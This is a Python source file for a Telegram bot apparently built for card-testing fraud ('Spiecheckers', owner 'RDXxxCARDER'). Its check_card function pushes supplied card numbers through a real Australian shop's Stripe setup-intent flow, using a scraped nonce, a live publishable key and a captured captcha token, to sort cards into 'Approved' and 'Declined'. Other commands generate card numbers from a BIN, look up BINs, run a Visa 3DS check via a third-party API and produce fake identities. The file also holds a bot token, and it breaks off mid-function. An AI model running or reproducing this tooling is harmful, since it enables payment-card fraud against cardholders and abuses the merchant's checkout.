import logging
import re
import requests
from bs4 import BeautifulSoup
import time
import asyncio
from dotenv import find_dotenv, load_dotenv
import os
from google import genai
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3

envpath = find_dotenv()
load_dotenv(envpath)

TOKEN = os.getenv("8207988534:AAFERuWYH4Vbw-p67TSM662WU20OkLJvVkg") # Get your Token from @Botfather 
API_KEY = os.getenv("GEMINI_API_KEY")

botconfig = {
    "botname" : "Spiecheckers",
    "botusername" : "@Spiecheckers_bot",
    "owner" : {
        "id" : 7613434345,
        "link" : "https://t.me/RDXxxCARDER",
        "name" : "𝙍𝘿𝙓"
    },
    "maingroup" : {
        "link" : "https://t.me/+WrUZROOU-hVlNTc9",
        "chat id" : -1002761446542
    },
    "mainchannel" :  "https://t.me/+WrUZROOU-hVlNTc9"
}

logging.basicConfig(filename= "logs.txt",
                    filemode= "w",
                    format="%(asctime)s - %(levelname)s : %(message)s",
                    level= logging.WARNING)

async def error_handler(udpate: Update, context : ContextTypes.DEFAULT_TYPE):
    logging.error(context.error + "From error handler")

def initialdb_setup(details):
    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Groups;")
    groups = cur.fetchall()

    cur.execute("SELECT * FROM Users;")
    users = cur.fetchall()

    cur.close()
    conn.close()

    if len(users) == 0:
        conn = sqlite3.connect("checkerdata.db")
        cur = conn.cursor()

        cur.execute("INSERT INTO Users (user_id, state, post) VALUES (?,?,?);" ,(details["owner"]["id"],"unbanned","owner"))

        conn.commit()
        cur.close()
        conn.close()
        logging.warning(f"Owner ID {details['owner']['id']} is given Owner's auth.")
    else:
        conn = sqlite3.connect("checkerdata.db")
        cur = conn.cursor()

        cur.execute("SELECT * FROM Users WHERE post = ?;",("owner",))
        ownerinfo = cur.fetchone()

        cur.close()
        conn.close()

        if ownerinfo:
            logging.warning(f"Owner ID {ownerinfo[0]} has the Owner's auth.")
        else:
            conn = sqlite3.connect("checkerdata.db")
            cur = conn.cursor()

            cur.execute("INSERT INTO Users (user_id, state, post) VALUES (?,?,?);" ,(details["owner"]["id"],"unbanned","owner"))

            cur.close()
            conn.close()

            logging.warning(f"Owner ID {details['owner']['id']} is given Owner's auth.")
    
    if len(groups) == 0:
        conn = sqlite3.connect("checkerdata.db")
        cur = conn.cursor()

        cur.execute("INSERT INTO Groups (chatid, link) VALUES (?,?);",(details["maingroup"]["chat id"],details["maingroup"]["link"]))

        conn.commit()
        cur.close()
        conn.close()
        logging.warning(f"Main auth Group ID : {details["maingroup"]["chat id"]} , Link : {details["maingroup"]["link"]} ( Bot users can use /check, /mcheck commands in this auth group )")
    else:
        conn = sqlite3.connect("checkerdata.db")
        cur = conn.cursor()

        cur.execute("SELECT * FROM Groups")
        maingroup = cur.fetchone()

        cur.close()
        conn.close()

        logging.warning(f"Main auth Group ID : {maingroup[0]} , Link : {maingroup[1]}")

initialdb_setup(botconfig)

def extract_nonce(response_text, url):
    soup = BeautifulSoup(response_text, 'html.parser')
    checkout_nonce = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
    
    if checkout_nonce:
        return checkout_nonce['value']
    stripe_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
    
    if stripe_nonce_match:
        return stripe_nonce_match.group(1)
    script_nonce_match = re.search(r'"nonce":"([^"]+)"', response_text)
    
    if script_nonce_match:
        return script_nonce_match.group(1)
    
    raise ValueError(f"Could not find any nonce on {url}")

def check_card(cc):
    try:
        cc, m, y, cvv = cc.split("|")
        y = y.replace("20", "") if y.startswith("20") else y
        headers = {
            'authority': 'buildersdiscountwarehouse.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://buildersdiscountwarehouse.com.au/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }
        
        response = requests.get(
            'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
            headers=headers,
        )
        try:
            nonce = extract_nonce(response.text,"jij")
        except:
            return {"status":"Declined ❌","response":"Failed to get nonce"}
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={y}&card[exp_month]={m}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbuildersdiscountwarehouse.com.au&time_on_page=49057&client_attribution_metadata[client_session_id]=93922220-e1e0-483b-97f5-21a46f63906b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=b90d2f6d-72ef-4655-9f6b-2b9fc127ced9&guid=40c42e90-9734-4fdb-9403-a58bb3f450877497e6&muid=9f107d21-e6b8-4510-a515-b0c599131f515cb4e2&sid=ab3050e1-7525-4e18-8d48-757ac68bc1e5d054f1&key=pk_live_51Q107x2KzKeWTXXpOywsGdTNQaEtZRRE9LKseUzC1oS3jOdQnP41co3ZYTIckSdqdv2DWOt8nnX469QiDEGacfzl00qHBbMx73&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU1MzczMjI4LCJjZGF0YSI6IkNhVzd3T2R4b3JHWUZaZzNxLy9NOHhRdkxxVmJBaFpldnZ5VTY0NW4yM0M0VGZ0MGtNZ3N1NzRSNUVKTTVXZHNFQXpVMU9tRlA5VUNKcm1GYStldGtqemhPTDhaVXZSby9IWDVpVWtMeGM3OG9KakhoM1pWald3T095SGJhQW9takJpeVZ0c2RlSGM4ZS96cmdKcWhINzM1ai93T2JmY0xBdnRaVHVoMUtvREdmbUlTRVZXcm1EWUFadXY5UVl0YzF3a3l2TkVXSDhYaDVrZkUiLCJwYXNza2V5IjoibkV6Y2Qrb3FVRG9rUWlhRXkwMUV6MW5NWC9mRHlWNWNoTVg2cVk4Qjg3TThFOGlGdTJYbUtEZXozQUl6L3ZYZUxXZjV1NmFZc3c2VVdpZ3hGcUZmU3l4MzN5YXlpYXgwV0xoY3pvak1NTG5zTCtiTjM2ODVSNzBTK0Y0a0tmOUltNzdEMUJUSS90NWY2VFlDTUlDb1V3OTUyWnozN2UrK0N3TnNlanY5ZHh5d0EyWUpTTGpqSllzZ2duL1FsRXBId1FWeXhxcm0reHByTFI4d3U3ZW45RGM4d1EzekUvZnJoU2hMT0pPUnZLbXFoOWZZUHRDa0dBSmQxa1pBQUg3MmpSdEpTa2NQMUVDSmNsbFowaWtkWVNoRnhRREI4bFQ3OWw0anJLMWcxdjAwR1JkaStYWlNzTVFVYmtzRGF4ekt1cmExc3phQnVCU29uQlFrSlJoeWVJZGdwdFo5blc5UG45aFd4RTRKOWpPOG1RbTlPTXgranNnd1czQUJZbmh1WDFjOFA4S0VLMTNScE5uODQ5RVdic0Q0QUd1VUdBNWh1ekpLV3lVY3h4MGVUaXM5cUtaTXczaDB6R2FmM2wxYVhTSjRVZW9kbjNqdHM5Tjh2SkdmR0F2bytDMExER3pEOHBtaHZsTzVBRjRHc2xGWmZpL0R0WUxNT3lnSnJFOUkyeGc1SEthSWdJeVJDMW94VU1FeUl6bmVGT0szVE11QzhadTBpcVQ4Zm1lNVJWTEVHREd4amVnV1hudExULzFyYmF5eVpPVEFjOWdKTnIyNzNyVlRjeHp6RkpoUHFuSTAvTTFLRjFnSkZORjlpZnBocDF4WTAvTXpCc0RmQ0g4VDJWczdJZkZudWR3RktjSnRGRlY3ZzlJRU1UcG94OEdySlRnOXFJUWFQWG15TEdFSnB0dkZndzJJNG9rb29USUlJa2NKeStMZFJENzJXamdrNEhsVUdRWHF2OVUzZGRZTEtUR21FZGlhVkJoWWNUSWdnei8xSlFHbFZRTGl4MFhEWUpLSG1QVFBlb0VuUWF4SEZnS29KM2RxT2xaUUt1U1ZBTlkvTXBFVzVDcVBrQ3U4QW1zL1RMbDFXSzB3MFJ0S3YyR2d2UktLYXBlUmp0akFyaGVlbjNRaGJaU3R2cEJDMGF4RHptaUl5WjlpNHB6MmZScXJLMUQ1dHNlZmZLTGZMWHNGV0ZSNFVnWUVYMCtuMi9SK0ZmeVdQdDZXNDViOVFHalFVWWFNbnZveVdyenVkYVR0RW5IcWdsbFVvaml5bFVWMURxN2hxL244WjhvVUF0b0pNSlVVNDNwVkhjV25FNlQ3MmlHc2EzWkZUSUVFMXk0aFgxY0Nya1FBZGxUZ2ppK2JpT1dmOUFEU1JLQ2pIWWRuZjNIV1RKQnEzcUZTdkxoR05qSjZQelUwSC91NmJFckJjYTRoL3BpV2xEZis5VU1XWTBFZE1qU1RkUk9HZG5UZWRYRHg5MmdReHFMRjF0MzVaVE13QlQrR0YwWmR0TnU2YnduemxIaURmaS8welBzdUtoVEVPb2NsRlNlamxSS0FTRkMzQjEzeURrcGxWcXA0UGxjcGppYXlIWDFHcGNCMjBidUNoZEp6alRTRnczaVVKZ01lSndmeGZQUVRFTG9QQ2d3SjlVcWI3VWlzZFgydzRKbThBZjBTVlozcGl5RU5pdU5laXNPSFp0NnJ4dkdEVThTQnlKcVJ2RW5jMjRZb3dJbTIrY29tWjUzbjc1c3dLY1FoVFFXbDZ2bDhkZDB2WFlwN2w5OFRIdVFTbWdrM2pQRjVzSFJleVJrQUdhcmo5NzlycVdsaEZtVGkvVGJ2bUNWYjNtVU9GZTcrRTlUblhPSVRxeUk5UWo0cjJoZHlsenh3cCttR1dNQU9qeVAvd20rMXhMUWxCQUVzdGQyalZsZThtbHY3ajA3RXE1OWVkUGNpYVNnWldOWjhKclUyTFZJV05pVTd6czhyQkpwOTFmdFFNdEg3c0lySHhkSXpjQVI4QlNBMVllelA0VWthSmxQVGF4dUlWMU5Oc1pGWE45UmlBTkZ4L3BtdWhFdTJDakZMZlZldUtHWDhMazJkRXM1S2tPOXVja3FiR054aXNDTnpHYnluVmt5YVlqUjFqWG5uMTh4eU8yREZLYXEyZmxoK1BMWWZUbE1lMEZCWkYrd3ZxOXBZaGhoQmZsVmZFcXBQZXFVUHlWZVp5TW5abzhOZEZLUnA1UmtCaldHZ0hvV3MyQ3hOc3d3ZXVZc3JrM092b3ZpeCIsImtyIjoiM2Y2ZTM4ZDkiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.qShofF8oyQnYv2j1XXcmy_BK8t5f99MaTL-jfmnFdqE'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            idd = response.json()["id"]
        except:
            return {"status":"Declined ❌","response":"Failed to get id"} 
        
        headers = {
            'authority': 'buildersdiscountwarehouse.com.au',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://buildersdiscountwarehouse.com.au',
            'referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }
        
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idd,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        response = requests.post('https://buildersdiscountwarehouse.com.au/', params=params, headers=headers, data=data)
        
        try:
            data= response.json()
            
            if "error" in data.get("data", {}):
                result = data["data"]["error"].get("message", "Unknown error")
                status = "Declined ❌"
            
            elif "status" in data.get("data", {}):
                result = data["data"]["status"]
                status = "Approved ✅"
            
            else:
                # fallback to raw response if nothing matched
                result = data
                status = "Raw Response 📦"
            
            return {"status": status, "response": result}
        except Exception as e:
            print(e)
            return {"status":"Declined ❌","response":"Error processing response"}
    except Exception as e:
        print(e)
        return {"status":"Declined ❌","response":"Error checking card"}

# Extract card from text
def extract_card(text):
    patt = r'(\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})'
    match = re.search(patt, text.replace(' ', ''))
    return match.group(1) if match else None

# Get card info from bin
def get_card_info(bin_code):
    try:
        binlist_data = requests.get('https://bins.antipublic.cc/bins/' + bin_code, timeout=10).json()
        try:
            bank = binlist_data['bank']['name']
        except:
            bank = 'unknown'
        try:
            country_flag = binlist_data['country']['emoji']
        except:
            country_flag = 'unknown'
        try:
            country = binlist_data['country']['name']
        except:
            country = 'unknown'
        try:
            brand = binlist_data['scheme']
        except:
            brand = 'unknown'
        try:
            card_type = binlist_data['type']
        except:
            card_type = 'unknown'
        
        return {
            'bank': bank,
            'country_flag': country_flag,
            'country': country,
            'brand': brand,
            'card_type': card_type
        }
    except:
        return {
            'bank': 'unknown',
            'country_flag': 'unknown',
            'country': 'unknown',
            'brand': 'unknown',
            'card_type': 'unknown'
        }


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    user_id = update.effective_user.id

    startbutton = [
        [InlineKeyboardButton("𝗧𝗼𝗼𝗹𝘀", callback_data="tools"),InlineKeyboardButton("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=channel)],
        [InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿", url = owner["link"]),InlineKeyboardButton("𝗗𝗲𝘃", url = "https://t.me/RDXxxCARDER")]
    ]

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users where user_id = ?;",(user_id,))
    user = cur.fetchall()

    cur.close()
    conn.close()

    if user == []:
        conn = sqlite3.connect("checkerdata.db")
        cur = conn.cursor()

        cur.execute("INSERT INTO Users (user_id, state, post) VALUES (?,?,?);",(user_id,"unbanned","user"))

        conn.commit()
        cur.close()
        conn.close()

        startbutton = [
            [InlineKeyboardButton("𝗧𝗼𝗼𝗹𝘀", callback_data="tools"),InlineKeyboardButton("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=channel)],
            [InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿", url = owner["link"]),InlineKeyboardButton("𝗗𝗲𝘃", url = "https://t.me/RDXxxCARDER")]
        ]
    
        await update.message.reply_text(
            text = f''' [<a href='{channel}'>ϟ</a>] <b>#𝗖𝗮𝗿𝗱𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | {name}</b> [<a href='{channel}'>ϟ</a>]
- - - - - - - - - - - - - - -
    
 [<a href='{channel}'>ϟ</a>] <i> To See Command List Please interact with my buttons!. </i>
''',
parse_mode= "HTML",
reply_markup= InlineKeyboardMarkup(startbutton),
disable_web_page_preview=True
    )
    else:
        if user[0][2] in ["owner","admin"]:
            await update.message.reply_text(
                text = f''' [<a href='{channel}'>ϟ</a>] <b>#𝗖𝗮𝗿𝗱𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | {name}</b> [<a href='{channel}'>ϟ</a>]
- - - - - - - - - - - - - - -
    
 [<a href='{channel}'>ϟ</a>] <i> To See Command List Please interact with my buttons!. </i>
 [<a href='{channel}'>ϟ</a>] <code>/admincmds</code> - <i> To See Admin commands. </i>
''',
parse_mode= "HTML",
reply_markup= InlineKeyboardMarkup(startbutton),
disable_web_page_preview=True
    )
        else:
            await update.message.reply_text(
                text = f''' [<a href='{channel}'>ϟ</a>] <b>#𝗖𝗮𝗿𝗱𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | {name}</b> [<a href='{channel}'>ϟ</a>]
- - - - - - - - - - - - - - -
    
 [<a href='{channel}'>ϟ</a>] <i> To See Command List Please interact with my buttons!. </i>
''',
parse_mode= "HTML",
reply_markup= InlineKeyboardMarkup(startbutton),
disable_web_page_preview=True
    )

def visacheck(card):
    try:
        response = requests.get(f"https://rocky-815m.onrender.com/gateway=bin?key=rockysoon&card={card}", timeout=10)
        data = response.json()

        if data["response"] == "Authenticate Successful":
            return "Visa Verified ✅"
        elif data["response"] == "Authenticate Frictionless Failed":
            return "Visa Unverified ❌"
        else:
            return "Visa Unknown ❓"
    except:
        return "API Error ❗"

async def check_command(update, context, card):
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    checking_msg = await update.message.reply_text("💳 <b>Checking your card...</b>", parse_mode="HTML")
    
    bin_code = card[:6]
    card_info = get_card_info(bin_code)
    
    # Check the card
    start_time = time.time()
    result = check_card(card)
    visainfo = visacheck(card)
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Format response
    status = result.get("status", "Unknown")
    response = result.get("response", "Unknown")
    
    if "Approved" in status:
        status_text = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    else:
        status_text = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
    
    # Create response message
    msg = f'''#𝗖𝗮𝗿𝗱𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | {name}
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[<a href="{channel}">ϟ</a>] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: <code>Stripe Auth</code>
[<a href="{channel}">ϟ</a>] 𝗦𝘁𝗮𝘁𝘂𝘀: <code>{status_text}</code>
[<a href="{channel}">ϟ</a>] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: <code>{response}</code>
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗕𝗶𝗻: <code>{bin_code}</code>
[<a href="{channel}">ϟ</a>] 𝗜𝗻𝗳𝗼: <code>{card_info['card_type']} - {card_info['brand']}</code>
[<a href="{channel}">ϟ</a>] 𝗕𝗮𝗻𝗸: <code>{card_info['bank']}</code>
[<a href="{channel}">ϟ</a>] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{card_info['country']} - [{card_info['country_flag']}]</code>
[<a href="{channel}">ϟ</a>] 𝗩𝗶𝘀𝗮 𝗖𝗵𝗲𝗰𝗸: {visainfo}
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗖𝗵𝗸 𝗯𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner["link"]}">{owner["name"]}</a>
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗧/𝘁: - [{"{:.1f}".format(execution_time)}s]'''

    # Create keyboard
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url= channel),
         InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", url= owner["link"])]
    ])
    
    # Update message with result
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=checking_msg.message_id,
        text=msg,
        parse_mode="HTML",
        reply_markup=keyboard,
        disable_web_page_preview=True
    )

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global botconfig
    group = botconfig["maingroup"]

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT user_id FROM Users WHERE post IN ('admin', 'owner');")
    admins = cur.fetchall()

    cur.execute("SELECT chatid FROM Groups;")
    grps = cur.fetchall()

    cur.close()
    conn.close()

    adminsid = [admin[0] for admin in admins]
    groupsid = [gp[0] for gp in grps]

    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide card details!</b>\n\nExample: <code>/check 4242424242424242|12|2025|123</code>",
            parse_mode="HTML"
        )
    else:
        if update.effective_user.id in adminsid:
            card_text = " ".join(context.args)
            card = extract_card(card_text)
    
            if not card:
                await update.message.reply_text(
                    text = "❌ <b>Invalid card format!</b>\n\nExample: <code>/check 4242424242424242|12|2025|123</code>",
                    parse_mode="HTML"
                )
            else:
                asyncio.create_task(check_command(update, context, card))
        else:
            if update.effective_chat.id not in groupsid:
                await update.message.reply_text(
                    text=f"❌ <i>Using this command in private chat or any other group is not allowed. Use the command here</i> 🔽\n\n🔗 <b>{group['link']}</b>\n🔗 <b>{group['link']}</b>\n🔗 <b>{group['link']}</b>\n",
                    parse_mode="HTML",
                    disable_web_page_preview=True
               )
            else:
                card_text = " ".join(context.args)
                card = extract_card(card_text)
            
                if not card:
                    await update.message.reply_text(
                        text = "❌ <b>Invalid card format!</b>\n\nExample: <code>/check 4242424242424242|12|2025|123</code>",
                        parse_mode="HTML"
                    )
                else:
                    conn = sqlite3.connect("checkerdata.db")
                    cur = conn.cursor()

                    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(update.effective_user.id,))
                    user = cur.fetchone()

                    cur.close()
                    conn.close()

                    if user[1] == "banned":
                        await update.message.reply_text(
                            text = "❌ <b>You are banned by the Admins from the bot.</b>",
                            parse_mode= "HTML"
                        )
                    else:
                        asyncio.create_task(check_command(update, context, card))

async def fake(update: Update, context : ContextTypes.DEFAULT_TYPE):
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide a country code!</b>\n\nExample: <code>/fake in</code> for India",
            parse_mode="HTML"
        )
        return
    
    text = context.args[0]

    country_codes = [
  "af", "ax", "al", "dz", "as", "ad", "ao", "ai", "aq", "ag",
  "ar", "am", "aw", "au", "at", "az", "bs", "bh", "bd", "bb",
  "by", "be", "bz", "bj", "bm", "bt", "bo", "bq", "ba", "bw",
  "bv", "br", "io", "bn", "bg", "bf", "bi", "cv", "kh", "cm",
  "ca", "ky", "cf", "td", "cl", "cn", "cx", "cc", "co", "km",
  "cd", "cg", "ck", "cr", "ci", "hr", "cu", "cw", "cy", "cz",
  "dk", "dj", "dm", "do", "ec", "eg", "sv", "gq", "er", "ee",
  "sz", "et", "fk", "fo", "fj", "fi", "fr", "gf", "pf", "tf",
  "ga", "gm", "ge", "de", "gh", "gi", "gr", "gl", "gd", "gp",
  "gu", "gt", "gg", "gn", "gw", "gy", "ht", "hm", "va", "hn",
  "hk", "hu", "is", "in", "id", "ir", "iq", "ie", "im", "il",
  "it", "jm", "jp", "je", "jo", "kz", "ke", "ki", "kp", "kr",
  "kw", "kg", "la", "lv", "lb", "ls", "lr", "ly", "li", "lt",
  "lu", "mo", "mk", "mg", "mw", "my", "mv", "ml", "mt", "mh",
  "mq", "mr", "mu", "yt", "mx", "fm", "md", "mc", "mn", "me",
  "ms", "ma", "mz", "mm", "na", "nr", "np", "nl", "nc", "nz",
  "ni", "ne", "ng", "nu", "nf", "mp", "no", "om", "pk", "pw",
  "ps", "pa", "pg", "py", "pe", "pn", "pl", "pf", "pr", "pt",
  "qa", "re", "ro", "ru", "rw", "bl", "sh", "kn", "lc", "mf",
  "pm", "vc", "ws", "sm", "st", "sa", "sn", "rs", "sc", "sl",
  "sg", "sx", "sk", "si", "sb", "so", "za", "gs", "ss", "es",
  "lk", "sd", "sr", "sj", "se", "ch", "sy", "tw", "tj", "tz",
  "th", "tl", "tg", "tk", "to", "tt", "tn", "tr", "tm", "tc",
  "tv", "ug", "ua", "ae", "gb", "us", "um", "uy", "uz", "vu",
  "ve", "vn", "vg", "vi", "wf", "eh", "ye", "zm", "zw"
]
    
    if context.args[0].lower() in country_codes:
        try:
            response = requests.get(f"https://randomuser.me/api/?nat={context.args[0].lower()}", timeout=10)
            data = response.json()

            await update.message.reply_text(
                text = f'''#𝗙𝗮𝗸𝗲_𝗨𝘀𝗲𝗿_𝗗𝗮𝘁𝗮 | {name}

👤 <b>Personal Info:</b>
[<a href="{channel}">ϟ</a>] Name: <code>{data["results"][0]["name"]["first"]} {data["results"][0]["name"]["last"]}</code>
[<a href="{channel}">ϟ</a>] Gender: <code>{data["results"][0]["gender"]}</code>
[<a href="{channel}">ϟ</a>] Age: <code>{data["results"][0]["dob"]["age"]}</code>
[<a href="{channel}">ϟ</a>] DOB: <code>{data["results"][0]["dob"]["date"].split("T")[0]}</code>

📧 <b>Contact:</b>
[<a href="{channel}">ϟ</a>] Email: <code>{data["results"][0]["email"]}</code>
[<a href="{channel}">ϟ</a>] Phone: <code>{data["results"][0]["phone"]}</code>
[<a href="{channel}">ϟ</a>] Cell: <code>{data["results"][0]["cell"]}</code>

🏠 <b>Address:</b>
[<a href="{channel}">ϟ</a>] Street: <code>{data["results"][0]["location"]["street"]["number"]} {data["results"][0]["location"]["street"]["name"]}</code>
[<a href="{channel}">ϟ</a>] City: <code>{data["results"][0]["location"]["city"]}</code>
[<a href="{channel}">ϟ</a>] State: <code>{data["results"][0]["location"]["state"]}</code>
[<a href="{channel}">ϟ</a>] Country: <code>{data["results"][0]["location"]["country"]}</code>
[<a href="{channel}">ϟ</a>] Postcode/Zip: <code>{data["results"][0]["location"]["postcode"]}</code>
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗚𝗲𝗻 𝗯𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner["link"]}">{owner["name"]}</a>
━━━━━━━━━━━━━━━━
''',
parse_mode = "HTML",
disable_web_page_preview=True
            )

        except Exception as error:
            logging.error(f"Error fetching fake user information {error}")

            await update.message.reply_text(
                text = "❌ <b>Failed to fetch fake user data. Please try again later.</b>", 
                parse_mode="HTML"
                )
    else:
        await update.message.reply_text(
            text = "❌ <b>Invalid country code!</b>\n\nExample: <code>/fake in</code> for India",
            parse_mode="HTML"
        )

async def gen(update: Update, context : ContextTypes.DEFAULT_TYPE):
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide a BIN!</b>\n\nExample: <code>/gen 424242</code>",
            parse_mode="HTML"
        )
        return

    bin = context.args[0]

    statmsg = await update.message.reply_text(
        text = f"✅ <b>Generating...</b>\n\nBIN: <code>{bin}</code>",
        parse_mode="HTML"
    )
    try:
        response = requests.get(f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin}&count=10", timeout = 10)
        cards = "".join(f"<code>{line}</code>\n" for line in response.text.split("\n"))

        await statmsg.edit_text(
            text = f'''#𝗖𝗮𝗿𝗱_𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 | {name}

💳 <b>Bin</b> : <code>{bin}</code>

{cards}
Amount : <code> 10 </code>

━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗚𝗲𝗻 𝗯𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner["link"]}">{owner["name"]}</a>
━━━━━━━━━━━━━━━━
''',
parse_mode = "HTML",
disable_web_page_preview=True
    )
    except Exception as error:
        logging.error(f"Error Generating cards from Bin {bin}",exc_info= True)

        await statmsg.edit_text(
            text = "❌ <b>Failed to generate cards. Please try again later.</b>", 
            parse_mode="HTML"
            )

async def bin(update: Update, context : ContextTypes.DEFAULT_TYPE):
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide a BIN!</b>\n\nExample: <code>/bin 424242</code>",
            parse_mode="HTML"
        )
        return

    bin_code = context.args[0]

    try:
        response = requests.get(f"https://drlabapis.onrender.com/api/bin?bin={bin_code}", timeout=10)
        data = response.json()

        await update.message.reply_text(
            text = f'''#𝗕𝗜𝗡_𝗟𝗼𝗼𝗸𝘂𝗽 | {name}

